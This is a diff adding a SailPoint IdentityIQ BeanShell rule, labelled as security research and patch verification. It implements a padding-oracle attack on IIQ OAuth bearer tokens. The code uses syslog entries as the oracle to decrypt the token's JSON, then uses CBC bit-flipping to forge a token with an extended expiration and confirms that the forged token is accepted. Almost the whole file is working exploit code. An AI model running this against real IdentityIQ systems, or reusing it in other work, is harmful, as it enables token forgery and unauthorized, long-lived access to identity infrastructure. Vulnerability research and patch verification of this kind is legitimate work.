@@ -1,0 +1,403 @@
+<?xml version='1.0' encoding='UTF-8'?>
+<!DOCTYPE sailpoint PUBLIC "sailpoint.dtd" "sailpoint.dtd">
+<!--
+  SECURITY RESEARCH / PATCH VERIFICATION ONLY
+
+  Demonstrates AES/CBC/PKCS padding-oracle style abuse against IIQ OAuth access
+  tokens (OAuthTokenIssuer.generateToken output). The oracle signal is taken
+  ONLY from SyslogEvent rows written when OAuthTokenValidator decrypt fails or
+  proceeds past padding — not from exception messages returned to the caller.
+
+  Prerequisites:
+    - Syslog enabled (Global Settings) at ERROR or lower threshold.
+    - A registered OAuth client (clientId + secret) whose proxy user is active.
+    - Run on a non-production system.
+
+  Console → Debug → Rule. Set variables below (or pass via config map), then Run.
+-->
+<sailpoint>
+
+<Rule language="beanshell" name="OAuth Token Syslog Padding Oracle Demo">
+  <Description>
+    Issues or accepts a baseline OAuth bearer token, decrypts the encrypted
+    payload using a Syslog-only padding oracle (calls OAuthTokenValidator as REST
+    would, reads sailpoint.object.SyslogEvent for BadPaddingException vs post-padding
+    failures), forges a same-length extended expiration via CBC malleability, and
+    validates the forged token through OAuthTokenValidator.authenticate.
+  </Description>
+
+  <Source><![CDATA[
+import sailpoint.object.Filter;
+import sailpoint.object.QueryOptions;
+import sailpoint.object.SyslogEvent;
+import sailpoint.object.Identity;
+import sailpoint.service.oauth.OAuthAccessToken;
+import sailpoint.service.oauth.OAuthTokenIssuer;
+import sailpoint.service.oauth.OAuthTokenRequest;
+import sailpoint.service.oauth.OAuthTokenResponse;
+import sailpoint.service.oauth.OAuthTokenValidator;
+import sailpoint.service.oauth.OAuthClientService;
+import sailpoint.service.oauth.OAuthConfigurationService;
+import sailpoint.tools.Base64Util;
+import sailpoint.tools.Util;
+
+import java.nio.charset.StandardCharsets;
+import java.util.Date;
+import java.util.HashMap;
+import java.util.Iterator;
+import java.util.Map;
+
+// --- Configure for Debug Rule (override via config map keys of the same name) ---
+String demoClientId = "*Amy.Cox";
+String demoClientSecret = null;          // required if baselineBearerToken is null
+String baselineBearerToken = null;       // optional: skip token endpoint if set
+String forgedExpiration = "1999999999";  // must match length of original expiration digits
+boolean runFullBlockDecrypt = true;      // false = skip POA decrypt (flip-only demo)
+int maxDecryptBlocks = 0;                // 0 = all ciphertext blocks
+
+// Get a baseline token using Amy.Cox
+try {
+    new OAuthConfigurationService(context).get();
+    Identity amy = context.getObjectByName(Identity.class, "amy.cox");
+    OAuthTokenResponse resp = OAuthTokenIssuer.generateToken(amy, context);
+    baselineBearerToken = resp.getAccessToken();
+    forgedExpiration = resp.getExpiresIn() + "";
+    log.warn("Baseline token: " + baselineBearerToken);
+    log.warn("forgedExpriation: " + forgedExpiration);
+} catch (Throwable t) {
+    log.error(t.getMessage(), t);
+    throw t;
+}
+
+Map result = new HashMap();
+int probeCount = 0;
+String VALIDATOR_CLASS = "OAuthTokenValidator";
+
+// ---------- Syslog-only oracle (do not inspect caught exceptions) ----------
+
+String classifySyslogSince(long sinceMs) {
+    long buffer = 0L;
+    QueryOptions qo = new QueryOptions();
+    qo.addFilter(Filter.gt("created", new Date(sinceMs - buffer)));
+    qo.addFilter(Filter.like("classname", VALIDATOR_CLASS, Filter.MatchMode.ANYWHERE));
+    qo.addOrdering("created", false);
+    qo.setResultLimit(5);
+
+    Iterator it = context.search(SyslogEvent.class, qo);
+    if (it == null) {
+        return "ACCEPT";
+    }
+
+    while (it.hasNext()) {
+        SyslogEvent ev = (SyslogEvent) it.next();
+        String msg = ev.getMessage();
+        String st = ev.getStacktrace();
+
+        if (st != null && st.indexOf("BadPaddingException") >= 0) {
+            return "BAD_PAD";
+        }
+        if (msg != null && msg.indexOf("Failed to decrypt the token") >= 0) {
+            if (st == null || st.indexOf("BadPaddingException") < 0) {
+                // non-padding decrypt failure
+                return "BAD_PAD";
+            }
+            return "BAD_PAD";
+        }
+        if (msg != null && msg.indexOf("Failed to create token from JSON") >= 0) {
+            return "GOOD_PAD";
+        }
+        if (msg != null && msg.indexOf("proxy user does not match") >= 0) {
+            return "GOOD_PAD";
+        }
+        if (msg != null && msg.indexOf("The token is null") >= 0) {
+            return "GOOD_PAD";
+        }
+    }
+    return "ACCEPT";
+}
+
+String probeBearerSyslogOnly(String bearer) {
+    probeCount = probeCount + 1;
+    long since = System.currentTimeMillis();
+    try {
+        OAuthTokenValidator.authenticate(bearer, context);
+    } catch (Exception ignore) {
+        // Oracle reads Syslog only — exception type/message are intentionally ignored.
+    }
+    return classifySyslogSince(since);
+}
+
+// ---------- Token wire format helpers ----------
+
+String[] splitOuterBearer(String bearer) {
+    if (bearer == null) {
+        throw new IllegalArgumentException("baseline bearer token is required");
+    }
+    String trimmed = bearer.trim();
+    if (trimmed.regionMatches(true, 0, "Bearer ", 0, 7)) {
+        trimmed = trimmed.substring(7).trim();
+    }
+    String decoded = new String(Base64Util.decode(trimmed), StandardCharsets.UTF_8);
+    log.warn("decoded: " + decoded);
+    int dot = decoded.lastIndexOf('.');
+    if (dot < 1) {
+        throw new IllegalArgumentException("Unexpected token layout (missing clientId prefix)");
+    }
+    return new String[] { decoded.substring(0, dot), decoded.substring(dot + 1) };
+}
+
+byte[] cloneBytes(byte[] src) {
+    byte[] copy = new byte[src.length];
+    System.arraycopy(src, 0, copy, 0, src.length);
+    return copy;
+}
+
+Map parseCipherLayout(String encryptedB64) {
+    byte[] inner = Base64Util.decode(encryptedB64);
+    if (inner.length < 32 || (inner.length % 16) != 0) {
+        throw new IllegalArgumentException("Encrypted segment length is not IV plus CBC blocks");
+    }
+    byte[] iv = new byte[16];
+    System.arraycopy(inner, 0, iv, 0, 16);
+    int blockCount = (inner.length - 16) / 16;
+    byte[][] blocks = new byte[blockCount][16];
+    for (int b = 0; b < blockCount; b++) {
+        System.arraycopy(inner, 16 + (b * 16), blocks[b], 0, 16);
+    }
+    Map layout = new HashMap();
+    layout.put("iv", iv);
+    layout.put("blocks", blocks);
+    return layout;
+}
+
+byte[] layoutToInnerBytes(Map layout) {
+    byte[] iv = (byte[]) layout.get("iv");
+    byte[][] blocks = (byte[][]) layout.get("blocks");
+    int blockCount = blocks.length;
+    byte[] inner = new byte[16 + (blockCount * 16)];
+    System.arraycopy(iv, 0, inner, 0, 16);
+    for (int b = 0; b < blockCount; b++) {
+        System.arraycopy(blocks[b], 0, inner, 16 + (b * 16), 16);
+    }
+    return inner;
+}
+
+String toBearerHeader(String accessToken) {
+    String trimmed = accessToken.trim();
+    if (trimmed.regionMatches(true, 0, "Bearer ", 0, 7)) {
+        return trimmed;
+    }
+    return "Bearer " + trimmed;
+}
+
+String buildBearer(String clientId, Map layout) {
+    String encryptedB64 = Base64Util.encodeBytes(layoutToInnerBytes(layout));
+    String outer = clientId + "." + encryptedB64;
+    return "Bearer " + Base64Util.encodeBytes(outer.getBytes(StandardCharsets.UTF_8));
+}
+
+Map cloneLayout(Map src) {
+    byte[] iv = cloneBytes((byte[]) src.get("iv"));
+    byte[][] srcBlocks = (byte[][]) src.get("blocks");
+    byte[][] blocks = new byte[srcBlocks.length][16];
+    for (int i = 0; i < srcBlocks.length; i++) {
+        blocks[i] = cloneBytes(srcBlocks[i]);
+    }
+    Map copy = new HashMap();
+    copy.put("iv", iv);
+    copy.put("blocks", blocks);
+    return copy;
+}
+
+// ---------- Padding-oracle block recovery (Syslog-only) ----------
+
+byte[] recoverPlainBlock(int targetBlockIndex, Map baseLayout, String clientId) {
+    byte[] iv = (byte[]) baseLayout.get("iv");
+    byte[][] blocks = (byte[][]) baseLayout.get("blocks");
+    byte[] recovered = new byte[16];
+    byte[] priorOriginal = (targetBlockIndex == 0)
+        ? cloneBytes(iv)
+        : cloneBytes(blocks[targetBlockIndex - 1]);
+    byte[] attackPrior = cloneBytes(priorOriginal);
+
+    for (int padLen = 1; padLen <= 16; padLen++) {
+        int padValue = padLen;
+        for (int j = 1; j < padLen; j++) {
+            int idx = 16 - j;
+            // intermediate[idx] = recovered[idx] ^ priorOriginal[idx]; force PKCS pad byte
+            attackPrior[idx] = (byte) (recovered[idx] ^ priorOriginal[idx] ^ padValue);
+        }
+
+        int foundGuess = -1;
+        for (int guess = 0; guess <= 255; guess++) {
+            attackPrior[16 - padLen] = (byte) guess;
+            Map trial = cloneLayout(baseLayout);
+            if (targetBlockIndex == 0) {
+                trial.put("iv", cloneBytes(attackPrior));
+            } else {
+                byte[][] trialBlocks = (byte[][]) trial.get("blocks");
+                trialBlocks[targetBlockIndex - 1] = cloneBytes(attackPrior);
+            }
+
+            String oracle = probeBearerSyslogOnly(buildBearer(clientId, trial));
+            if ("GOOD_PAD".equals(oracle) || "ACCEPT".equals(oracle)) {
+                int intermediate = guess ^ padValue;
+                recovered[16 - padLen] = (byte) (intermediate ^ priorOriginal[16 - padLen]);
+                foundGuess = guess;
+                break;
+            }
+        }
+        if (foundGuess < 0) {
+            throw new RuntimeException(
+                "Syslog padding oracle failed at block " + targetBlockIndex + ", padLen=" + padLen);
+        }
+    }
+    return recovered;
+}
+
+byte[] recoverPlaintextViaSyslog(Map layout, String clientId, int blockLimit) {
+    byte[][] blocks = (byte[][]) layout.get("blocks");
+    int totalBlocks = blocks.length;
+    int blocksToRecover = (blockLimit > 0 && blockLimit < totalBlocks) ? blockLimit : totalBlocks;
+    byte[] plain = new byte[blocksToRecover * 16];
+    for (int b = 0; b < blocksToRecover; b++) {
+        byte[] blockPlain = recoverPlainBlock(b, layout, clientId);
+        System.arraycopy(blockPlain, 0, plain, b * 16, 16);
+    }
+    return plain;
+}
+
+int pkcs7UnpadLength(byte[] padded) {
+    if (padded.length == 0 || (padded.length % 16) != 0) {
+        throw new IllegalArgumentException("Invalid padded plaintext length");
+    }
+    int pad = padded[padded.length - 1] & 0xFF;
+    if (pad < 1 || pad > 16) {
+        throw new IllegalArgumentException("Invalid PKCS padding byte");
+    }
+    for (int i = padded.length - pad; i < padded.length; i++) {
+        if ((padded[i] & 0xFF) != pad) {
+            throw new IllegalArgumentException("Invalid PKCS padding content");
+        }
+    }
+    return padded.length - pad;
+}
+
+// ---------- Same-length expiration forge (CBC XOR, informed by recovered JSON) ----------
+
+Map forgeExpirationCbcFlip(Map layout, String json, String newExpirationDigits) {
+    log.warn("JSON: " + json);
+    String marker = "\"expiration\":";
+    int markerIdx = json.indexOf(marker);
+    if (markerIdx < 0) {
+        throw new IllegalArgumentException("JSON has no expiration field");
+    }
+    int valueStart = markerIdx + marker.length();
+    int valueEnd = valueStart;
+    while (valueEnd < json.length() && Character.isDigit(json.charAt(valueEnd))) {
+        valueEnd = valueEnd + 1;
+    }
+    String oldDigits = json.substring(valueStart, valueEnd);
+    if (oldDigits.length() != newExpirationDigits.length()) {
+        throw new IllegalArgumentException(
+            "forgedExpiration must be same length as original (" + oldDigits.length() + " digits)");
+    }
+
+    Map forged = cloneLayout(layout);
+    byte[][] forgedBlocks = (byte[][]) forged.get("blocks");
+    for (int i = 0; i < oldDigits.length(); i++) {
+        int plainOffset = valueStart + i;
+        int blockIndex = plainOffset / 16;
+        int byteInBlock = plainOffset % 16;
+        if (blockIndex <= 0) {
+            throw new IllegalArgumentException("expiration sits in first plaintext block; use POA re-encryption");
+        }
+        int oldB = (int) oldDigits.charAt(i);
+        int newB = (int) newExpirationDigits.charAt(i);
+        int xorMask = oldB ^ newB;
+        int priorBlock = blockIndex - 1;
+        forgedBlocks[priorBlock][byteInBlock] =
+            (byte) (forgedBlocks[priorBlock][byteInBlock] ^ xorMask);
+    }
+    return forged;
+}
+
+// ---------- Baseline token via token service (same API REST uses) ----------
+
+String issueBaselineToken(String clientId, String clientSecret) {
+    if (Util.isNullOrEmpty(clientSecret)) {
+        throw new IllegalArgumentException("clientSecret is required when baselineBearerToken is not supplied");
+    }
+    String basicInner = clientId + ":" + clientSecret;
+    String basicHeader = "Basic " + Base64Util.encodeBytes(basicInner.getBytes(StandardCharsets.UTF_8));
+    OAuthTokenRequest req = new OAuthTokenRequest(
+        basicHeader,
+        OAuthTokenIssuer.GrantType.CLIENT_CREDENTIALS.toString(),
+        null);
+    OAuthTokenResponse resp = OAuthTokenIssuer.generateToken(req, context);
+    return resp.getAccessToken();
+}
+
+// ---------- Main demo flow ----------
+
+try {
+    String bearer = baselineBearerToken;
+    if (Util.isNullOrEmpty(bearer)) {
+        bearer = issueBaselineToken(demoClientId, demoClientSecret);
+        result.put("issuedBaselineToken", true);
+    } else {
+        result.put("issuedBaselineToken", false);
+    }
+    result.put("baselineAccessToken", bearer);
+
+    String[] parts = splitOuterBearer(bearer);
+    log.warn("Parts: " + Arrays.toString(parts));
+    String clientId = parts[0];
+    String encryptedB64 = parts[1];
+    if (!demoClientId.equals(clientId)) {
+        log.warn("Token clientId " + clientId + " differs from demoClientId " + demoClientId);
+    }
+
+    Map layout = parseCipherLayout(encryptedB64);
+    byte[][] layoutBlocks = (byte[][]) layout.get("blocks");
+    result.put("cipherBlockCount", new Integer(layoutBlocks.length));
+
+    String decryptedJson = null;
+    if (runFullBlockDecrypt) {
+        byte[] paddedPlain = recoverPlaintextViaSyslog(layout, clientId, maxDecryptBlocks);
+        int unpaddedLen = pkcs7UnpadLength(paddedPlain);
+        decryptedJson = new String(paddedPlain, 0, unpaddedLen, StandardCharsets.UTF_8);
+        result.put("decryptedViaSyslogOracle", decryptedJson);
+    } else {
+        OAuthAccessToken baseline = OAuthTokenValidator.authenticate(toBearerHeader(bearer), context);
+        decryptedJson = baseline.toString();
+        result.put("decryptedViaSyslogOracle", "(skipped — set runFullBlockDecrypt=true for POA decrypt)");
+        result.put("baselineTokenJsonReference", decryptedJson);
+    }
+
+    Map forgedLayout = forgeExpirationCbcFlip(layout, decryptedJson, forgedExpiration);
+    String forgedBearer = buildBearer(clientId, forgedLayout);
+    result.put("forgedBearerToken", forgedBearer);
+    result.put("forgedOuterAccessToken",
+        Base64Util.encodeBytes((clientId + "." + Base64Util.encodeBytes(layoutToInnerBytes(forgedLayout)))
+            .getBytes(StandardCharsets.UTF_8)));
+
+    OAuthAccessToken forgedToken = OAuthTokenValidator.authenticate(forgedBearer, context);
+    result.put("forgedTokenValid", Boolean.TRUE);
+    result.put("forgedExpirationSeconds", new Long(forgedToken.getExpiration()));
+    result.put("forgedIdentityId", forgedToken.getIdentityId());
+    result.put("probeCount", new Integer(probeCount));
+    result.put("status", "SUCCESS");
+}
+catch (Throwable e) {
+    log.error("OAuth syslog padding-oracle demo failed.", e);
+    result.put("status", "FAILED");
+    result.put("error", e.toString());
+    result.put("probeCount", new Integer(probeCount));
+}
+
+return result;
+  ]]></Source>
+</Rule>
+
+</sailpoint>
